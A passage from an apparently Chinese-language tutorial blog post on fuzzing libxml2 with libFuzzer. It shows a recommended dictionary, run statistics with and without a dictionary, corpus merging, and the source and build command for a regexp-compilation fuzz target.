class="string">&quot;\x97\x00&quot;</span> # Uses: <span class="number">301</span></span><br><span class="line"><span class="string">&quot;\x0d\x00&quot;</span> # Uses: <span class="number">335</span></span><br><span class="line"><span class="string">&quot;\xfe\xff\xff\xff&quot;</span> # Uses: <span class="number">273</span></span><br><span class="line"><span class="string">&quot;UCS-&quot;</span> # Uses: <span class="number">294</span></span><br><span class="line"><span class="string">&quot;\x15\x00&quot;</span> # Uses: <span class="number">277</span></span><br><span class="line"><span class="string">&quot;\x00\x00&quot;</span> # Uses: <span class="number">289</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x1c&quot;</span> # Uses: <span class="number">258</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff!&quot;</span> # Uses: <span class="number">257</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x01&quot;</span> # Uses: <span class="number">250</span></span><br><span class="line"><span class="string">&quot;UTF-1&quot;</span> # Uses: <span class="number">250</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xffN&quot;</span> # Uses: <span class="number">236</span></span><br><span class="line"><span class="string">&quot;UTF-16LE&quot;</span> # Uses: <span class="number">223</span></span><br><span class="line"><span class="string">&quot;ISO-10&quot;</span> # Uses: <span class="number">228</span></span><br><span class="line"><span class="string">&quot;ISO-1064&quot;</span> # Uses: <span class="number">256</span></span><br><span class="line"><span class="string">&quot;\x0a\x00\x00\x00&quot;</span> # Uses: <span class="number">246</span></span><br><span class="line"><span class="string">&quot;Q\x00\x00\x00&quot;</span> # Uses: <span class="number">247</span></span><br><span class="line"><span class="string">&quot;\xf1\x1f\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">212</span></span><br><span class="line"><span class="string">&quot;$\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">194</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x0e&quot;</span> # Uses: <span class="number">211</span></span><br><span class="line"><span class="string">&quot;\x09\x00&quot;</span> # Uses: <span class="number">226</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\xfa&quot;</span> # Uses: <span class="number">212</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x02&quot;</span> # Uses: <span class="number">239</span></span><br><span class="line"><span class="string">&quot;\xac\x0f\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">206</span></span><br><span class="line"><span class="string">&quot;\xffO&quot;</span> # Uses: <span class="number">263</span></span><br><span class="line"><span class="string">&quot;\xff\x03&quot;</span> # Uses: <span class="number">235</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\x10&quot;</span> # Uses: <span class="number">200</span></span><br><span class="line"><span class="string">&quot;\xf4\x01\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">203</span></span><br><span class="line"><span class="string">&quot;UTF-16BE&quot;</span> # Uses: <span class="number">188</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00P&quot;</span> # Uses: <span class="number">207</span></span><br><span class="line"><span class="string">&quot;\x0a\x00&quot;</span> # Uses: <span class="number">196</span></span><br><span class="line"><span class="string">&quot;\xff\xff&quot;</span> # Uses: <span class="number">203</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\x97\x96\x80&quot;</span> # Uses: <span class="number">186</span></span><br><span class="line"><span class="string">&quot;\x01 \x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">187</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00$&quot;</span> # Uses: <span class="number">156</span></span><br><span class="line"><span class="string">&quot;P\x00&quot;</span> # Uses: <span class="number">186</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff&quot;</span> # Uses: <span class="number">197</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x09&quot;</span> # Uses: <span class="number">202</span></span><br><span class="line"><span class="string">&quot;\x12\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">204</span></span><br><span class="line"><span class="string">&quot;\x01\x01&quot;</span> # Uses: <span class="number">170</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x00\x10&quot;</span> # Uses: <span class="number">197</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\x03&quot;</span> # Uses: <span class="number">183</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">174</span></span><br><span class="line"><span class="string">&quot;\xff\x05&quot;</span> # Uses: <span class="number">198</span></span><br><span class="line"><span class="string">&quot;US-ASCII&quot;</span> # Uses: <span class="number">214</span></span><br><span class="line"><span class="string">&quot;\x01\x00&quot;</span> # Uses: <span class="number">201</span></span><br><span class="line"><span class="string">&quot;xlmns&quot;</span> # Uses: <span class="number">189</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x14&quot;</span> # Uses: <span class="number">191</span></span><br><span class="line"><span class="string">&quot;xmlsn&quot;</span> # Uses: <span class="number">179</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x03&quot;</span> # Uses: <span class="number">201</span></span><br><span class="line"><span class="string">&quot;xmlns&quot;</span> # Uses: <span class="number">182</span></span><br><span class="line"><span class="string">&quot;\xaf\x0f\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">186</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\x0e\xb9&quot;</span> # Uses: <span class="number">176</span></span><br><span class="line"><span class="string">&quot;\xff\x09&quot;</span> # Uses: <span class="number">178</span></span><br><span class="line"><span class="string">&quot;ISO-1&quot;</span> # Uses: <span class="number">191</span></span><br><span class="line"><span class="string">&quot;la&quot;</span> # Uses: <span class="number">157</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00&quot;</span> # Uses: <span class="number">173</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x00\x14&quot;</span> # Uses: <span class="number">172</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x7f\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">164</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x04&quot;</span> # Uses: <span class="number">154</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">153</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x02&quot;</span> # Uses: <span class="number">136</span></span><br><span class="line"><span class="string">&quot;\x04\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">140</span></span><br><span class="line"><span class="string">&quot;ISO-10646-&quot;</span> # Uses: <span class="number">146</span></span><br><span class="line"><span class="string">&quot;id&quot;</span> # Uses: <span class="number">155</span></span><br><span class="line"><span class="string">&quot;\x00\x01&quot;</span> # Uses: <span class="number">145</span></span><br><span class="line"><span class="string">&quot;\x00\x02&quot;</span> # Uses: <span class="number">140</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x08&quot;</span> # Uses: <span class="number">165</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x1e&quot;</span> # Uses: <span class="number">136</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff~\xff\xff\xff&quot;</span> # Uses: <span class="number">130</span></span><br><span class="line"><span class="string">&quot;\x81\x96\x98\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">150</span></span><br><span class="line"><span class="string">&quot;\x03\x00\x00\x00&quot;</span> # Uses: <span class="number">116</span></span><br><span class="line"><span class="string">&quot;\x18\x00\x00\x00&quot;</span> # Uses: <span class="number">176</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\xf9&quot;</span> # Uses: <span class="number">124</span></span><br><span class="line"><span class="string">&quot;%\x17\x8f[&quot;</span> # Uses: <span class="number">130</span></span><br><span class="line"><span class="string">&quot;\x0e\x00\x00\x00&quot;</span> # Uses: <span class="number">142</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x00\xfa&quot;</span> # Uses: <span class="number">96</span></span><br><span class="line"><span class="string">&quot;\x06\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">116</span></span><br><span class="line"><span class="string">&quot;\x00\x04&quot;</span> # Uses: <span class="number">161</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x0b&quot;</span> # Uses: <span class="number">119</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x06&quot;</span> # Uses: <span class="number">141</span></span><br><span class="line"><span class="string">&quot;annnn\xd4nnnnnn&quot;</span> # Uses: <span class="number">100</span></span><br><span class="line"><span class="string">&quot;\x1f\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">106</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x17&quot;</span> # Uses: <span class="number">114</span></span><br><span class="line"><span class="string">&quot;\x16\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">122</span></span><br><span class="line"><span class="string">&quot;\x0f\x00&quot;</span> # Uses: <span class="number">121</span></span><br><span class="line"><span class="string">&quot;inlc0a&quot;</span> # Uses: <span class="number">128</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00O&quot;</span> # Uses: <span class="number">101</span></span><br><span class="line"><span class="string">&quot;\x01\x04&quot;</span> # Uses: <span class="number">117</span></span><br><span class="line"><span class="string">&quot;\x01P&quot;</span> # Uses: <span class="number">122</span></span><br><span class="line"><span class="string">&quot;\xfb\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">95</span></span><br><span class="line"><span class="string">&quot;\x03\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">107</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x03&quot;</span> # Uses: <span class="number">98</span></span><br><span class="line"><span class="string">&quot;\x00#&quot;</span> # Uses: <span class="number">102</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x0d&quot;</span> # Uses: <span class="number">92</span></span><br><span class="line"><span class="string">&quot;ISO-8859-1&quot;</span> # Uses: <span class="number">100</span></span><br><span class="line"><span class="string">&quot;\xff\xf9&quot;</span> # Uses: <span class="number">77</span></span><br><span class="line"><span class="string">&quot;\xf7\x0f\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">79</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\xfb&quot;</span> # Uses: <span class="number">82</span></span><br><span class="line"><span class="string">&quot;\x01\x0b&quot;</span> # Uses: <span class="number">101</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\x0e\xff&quot;</span> # Uses: <span class="number">78</span></span><br><span class="line"><span class="string">&quot;&gt;&lt;&gt;\xb7&quot;</span> # Uses: <span class="number">81</span></span><br><span class="line"><span class="string">&quot;&lt;b&quot;</span> # Uses: <span class="number">81</span></span><br><span class="line"><span class="string">&quot;UTF-8\x00&quot;</span> # Uses: <span class="number">76</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\x09&quot;</span> # Uses: <span class="number">63</span></span><br><span class="line"><span class="string">&quot;#\x00\x00\x00&quot;</span> # Uses: <span class="number">75</span></span><br><span class="line"><span class="string">&quot;S\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">73</span></span><br><span class="line"><span class="string">&quot;a\xff&quot;</span> # Uses: <span class="number">70</span></span><br><span class="line"><span class="string">&quot;TIONb&quot;</span> # Uses: <span class="number">46</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00?&quot;</span> # Uses: <span class="number">69</span></span><br><span class="line"><span class="string">&quot;!\x00\x00\x00&quot;</span> # Uses: <span class="number">67</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x01&quot;</span> # Uses: <span class="number">74</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\x1f\x02&quot;</span> # Uses: <span class="number">57</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x00\x16&quot;</span> # Uses: <span class="number">57</span></span><br><span class="line"><span class="string">&quot;-\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">53</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x05&quot;</span> # Uses: <span class="number">65</span></span><br><span class="line"><span class="string">&quot;:b&quot;</span> # Uses: <span class="number">67</span></span><br><span class="line"><span class="string">&quot;\x17\x1c_&gt;&quot;</span> # Uses: <span class="number">63</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\x18&quot;</span> # Uses: <span class="number">64</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00&#x27;&quot;</span> # Uses: <span class="number">45</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x05&quot;</span> # Uses: <span class="number">52</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x0d&quot;</span> # Uses: <span class="number">51</span></span><br><span class="line"><span class="string">&quot;US-AS&quot;</span> # Uses: <span class="number">48</span></span><br><span class="line"><span class="string">&quot;a&gt;&quot;</span> # Uses: <span class="number">53</span></span><br><span class="line"><span class="string">&quot;C\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">44</span></span><br><span class="line"><span class="string">&quot;\xff\xff\x00\x00&quot;</span> # Uses: <span class="number">36</span></span><br><span class="line"><span class="string">&quot;\x01\x07&quot;</span> # Uses: <span class="number">49</span></span><br><span class="line"><span class="string">&quot;@\x00\x00\x00&quot;</span> # Uses: <span class="number">46</span></span><br><span class="line"><span class="string">&quot;\x02\x00&quot;</span> # Uses: <span class="number">32</span></span><br><span class="line"><span class="string">&quot;+\x00&quot;</span> # Uses: <span class="number">37</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00 \x02&quot;</span> # Uses: <span class="number">42</span></span><br><span class="line"><span class="string">&quot;\x00\x0f&quot;</span> # Uses: <span class="number">37</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff$&quot;</span> # Uses: <span class="number">49</span></span><br><span class="line"><span class="string">&quot;ASCII&quot;</span> # Uses: <span class="number">40</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x01\x00&quot;</span> # Uses: <span class="number">30</span></span><br><span class="line"><span class="string">&quot;a\xff:-\xec&quot;</span> # Uses: <span class="number">27</span></span><br><span class="line"><span class="string">&quot;\xff\x1a&quot;</span> # Uses: <span class="number">30</span></span><br><span class="line"><span class="string">&quot;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&amp;&#x27;&#x27;&quot;</span> # Uses: <span class="number">23</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x01\x1d&quot;</span> # Uses: <span class="number">34</span></span><br><span class="line"><span class="string">&quot;TIOIb&quot;</span> # Uses: <span class="number">19</span></span><br><span class="line"><span class="string">&quot;J\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">15</span></span><br><span class="line"><span class="string">&quot;N\x00\x00\x00&quot;</span> # Uses: <span class="number">10</span></span><br><span class="line"><span class="string">&quot;\x01O&quot;</span> # Uses: <span class="number">8</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x02&quot;</span> # Uses: <span class="number">6</span></span><br><span class="line"><span class="string">&quot;HTML&quot;</span> # Uses: <span class="number">8</span></span><br><span class="line"><span class="string">&quot;\x00P&quot;</span> # Uses: <span class="number">9</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x00&quot;</span> # Uses: <span class="number">9</span></span><br><span class="line"><span class="string">&quot;\xff\x06&quot;</span> # Uses: <span class="number">9</span></span><br><span class="line"><span class="string">&quot;\x7f\x96\x98\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">4</span></span><br><span class="line"><span class="string">&quot;^&gt;&lt;b&gt;&quot;</span> # Uses: <span class="number">5</span></span><br><span class="line"><span class="string">&quot;\x01\x0a&quot;</span> # Uses: <span class="number">5</span></span><br><span class="line"><span class="string">&quot;\x13\x00&quot;</span> # Uses: <span class="number">1</span></span><br><span class="line">###### End of recommended dictionary. ######</span><br><span class="line">Done <span class="number">479244</span> runs in <span class="number">61</span> second(s)</span><br><span class="line">stat::number_of_executed_units: <span class="number">479244</span></span><br><span class="line">stat::average_exec_per_sec:     <span class="number">7856</span></span><br><span class="line">stat::new_units_added:          <span class="number">5007</span></span><br><span class="line">stat::slowest_unit_time_sec:    <span class="number">0</span></span><br><span class="line">stat::peak_rss_mb:              <span class="number">467</span></span><br></pre></td></tr></table></figure><p>可以看到最后还给出了<code>Recommended dictionary</code>，可以更新到我们的.dict中。<br><code>stat::new_units_added:          4709</code>说明最终探测到了5007个代码单元。<br>不使用字典的话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Done 402774 runs in 61 second(s)</span><br><span class="line">stat::number_of_executed_units: 402774</span><br><span class="line">stat::average_exec_per_sec:     6602</span><br><span class="line">stat::new_units_added:          3761</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              453</span><br></pre></td></tr></table></figure><p>可以看到使用字典效率确实提高不少。</p><p>此外，当我们长时间fuzz时，会产生和编译出很多样本，这些样本存放在语料库corpus中，例如上面就产生了<code>➜  08 git:(master) ✗ ls -lR| grep &quot;^-&quot; | wc -l 7217</code> 7217个样本，其中很多是重复的，我们可以通过以下方法进行精简(使用-merge&#x3D;1标志)：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">mkdir corpus1_min</span><br><span class="line">corpus1_min: 精简后的样本集存放的位置</span><br><span class="line">corpus1: 原始样本集存放的位置</span><br><span class="line"></span><br><span class="line">➜  <span class="number">08</span> git:(master) ✗ ./libxml2-v2<span class="number">.9</span><span class="number">.2</span>-fsanitize_fuzzer1 -merge=<span class="number">1</span> corpus1_min corpus1</span><br><span class="line">INFO: Seed: <span class="number">1264856731</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">53343</span> inline <span class="number">8</span>-bit counters): <span class="number">53343</span> [<span class="number">0xd27740</span>, <span class="number">0xd3479f</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">53343</span> PCs): <span class="number">53343</span> [<span class="number">0x9b3650</span>,<span class="number">0xa83c40</span>), </span><br><span class="line">MERGE-OUTER: <span class="number">2724</span> files, <span class="number">0</span> in the initial corpus</span><br><span class="line">MERGE-OUTER: attempt <span class="number">1</span></span><br><span class="line">INFO: Seed: <span class="number">1264900516</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">53343</span> inline <span class="number">8</span>-bit counters): <span class="number">53343</span> [<span class="number">0xd27740</span>, <span class="number">0xd3479f</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">53343</span> PCs): <span class="number">53343</span> [<span class="number">0x9b3650</span>,<span class="number">0xa83c40</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">1048576</span> bytes</span><br><span class="line">MERGE-INNER: using the control file <span class="string">&#x27;/tmp/libFuzzerTemp.8187.txt&#x27;</span></span><br><span class="line">MERGE-INNER: <span class="number">2724</span> total files; <span class="number">0</span> processed earlier; will process <span class="number">2724</span> files now</span><br><span class="line">#<span class="number">1</span>pulse  cov: <span class="number">464</span> exec/s: <span class="number">0</span> rss: <span class="number">32</span>Mb</span><br><span class="line">#<span class="number">2</span>pulse  cov: <span class="number">470</span> exec/s: <span class="number">0</span> rss: <span class="number">33</span>Mb</span><br><span class="line">#<span class="number">4</span>pulse  cov: <span class="number">502</span> exec/s: <span class="number">0</span> rss: <span class="number">33</span>Mb</span><br><span class="line">#<span class="number">8</span>pulse  cov: <span class="number">522</span> exec/s: <span class="number">0</span> rss: <span class="number">34</span>Mb</span><br><span class="line">#<span class="number">16</span>pulse  cov: <span class="number">533</span> exec/s: <span class="number">0</span> rss: <span class="number">34</span>Mb</span><br><span class="line">#<span class="number">32</span>pulse  cov: <span class="number">681</span> exec/s: <span class="number">0</span> rss: <span class="number">35</span>Mb</span><br><span class="line">#<span class="number">64</span>pulse  cov: <span class="number">756</span> exec/s: <span class="number">0</span> rss: <span class="number">36</span>Mb</span><br><span class="line">#<span class="number">128</span>pulse  cov: <span class="number">1077</span> exec/s: <span class="number">0</span> rss: <span class="number">39</span>Mb</span><br><span class="line">#<span class="number">256</span>pulse  cov: <span class="number">1247</span> exec/s: <span class="number">0</span> rss: <span class="number">45</span>Mb</span><br><span class="line">#<span class="number">512</span>pulse  cov: <span class="number">1553</span> exec/s: <span class="number">0</span> rss: <span class="number">55</span>Mb</span><br><span class="line">#<span class="number">1024</span>pulse  cov: <span class="number">2166</span> exec/s: <span class="number">0</span> rss: <span class="number">77</span>Mb</span><br><span class="line">#<span class="number">2048</span>pulse  cov: <span class="number">2550</span> exec/s: <span class="number">2048</span> rss: <span class="number">120</span>Mb</span><br><span class="line">#<span class="number">2724</span>DONE  cov: <span class="number">2666</span> exec/s: <span class="number">2724</span> rss: <span class="number">155</span>Mb</span><br><span class="line">MERGE-OUTER: succesfull in <span class="number">1</span> attempt(s)</span><br><span class="line">MERGE-OUTER: the control file has <span class="number">287194</span> bytes</span><br><span class="line">MERGE-OUTER: consumed <span class="number">0</span>Mb (<span class="number">38</span>Mb rss) to parse the control file</span><br><span class="line">MERGE-OUTER: <span class="number">2313</span> <span class="built_in">new</span> files with <span class="number">8750</span> <span class="built_in">new</span> features added; <span class="number">2666</span> <span class="built_in">new</span> coverage edges</span><br></pre></td></tr></table></figure><p>精简到了2313个样本。</p><p>workshop还提供了另一个fuzz target:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="number">08</span> git:(master) ✗ cat xml_compile_regexp_fuzzer.cc </span><br><span class="line"><span class="comment">// Copyright 2016 The Chromium Authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/parser.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/tree.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/xmlversion.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ignore</span> <span class="params">(<span class="type">void</span> * ctx, <span class="type">const</span> <span class="type">char</span> * msg, ...)</span> &#123;</span><br><span class="line">  <span class="comment">// Error handler to avoid spam of error messages from libxml parser.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Entry point for LibFuzzer.</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  xmlSetGenericErrorFunc(<span class="literal">NULL</span>, &amp;ignore);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">uint8_t</span>&gt; <span class="title function_">buffer</span><span class="params">(size + <span class="number">1</span>, <span class="number">0</span>)</span>;</span><br><span class="line">  <span class="built_in">std</span>::copy(data, data + size, buffer.data());</span><br><span class="line"></span><br><span class="line">  xmlRegexpPtr x = xmlRegexpCompile(buffer.data());</span><br><span class="line">  <span class="keyword">if</span> (x)</span><br><span class="line">    xmlRegFreeRegexp(x);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与之前的不同，将输入的数据copy到buffer中，再交给<code>xmlRegexpCompile</code>处理。编译运行如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="number">08</span> git:(master) ✗ clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=c++<span class="number">11</span> xml_compile_regexp_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2<span class="number">.9</span><span class="number">.2</span>-fsanitize_fuzzer1 </span><br><span class="line">➜  <span class="number">08</span> git:(master) ✗ ./libxml2-v2<span class="number">.9</span><span class="number">.2</span>-fsanitize_fuzzer1 -dict=./xml.dict</span><br><span class="line">Dictionary: <span class="number">60</span> entries</span><br><span class="line">INFO: Seed: <span class="number">2400921417</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">53352</span> inline <span class="number">8</span>-bit counters): <span class="number">53352</span> [<span class="number">0xd27700</span>, <span class="number">0xd34768</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">53352</span> PCs): <span class="number">53352</span> [<span class="number">0x9b36f0</span>,<span class="number">0xa83d70</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">114</span> ft: <span class="number">115</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">30</span>Mb</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">5</span>]: <span class="number">0x551cf0</span> in ignore(void*, char <span class="keyword">const</span>*, ...) /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/xml_compile_regexp_fuzzer.cc:<span class="number">16</span></span><br><span class="line">NEW_FUNC[<span class="number">2</span>/<span class="number">5</span>]: <span class="number">0x552d00</span> in __xmlRaiseError /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/libxml2/<span class="type">error</span>.c:<span class="number">461</span></span><br><span class="line">#<span class="number">6</span>NEW    cov: <span class="number">150</span> ft: <span class="number">169</span> corp: <span class="number">2</span>/<span class="number">2</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span 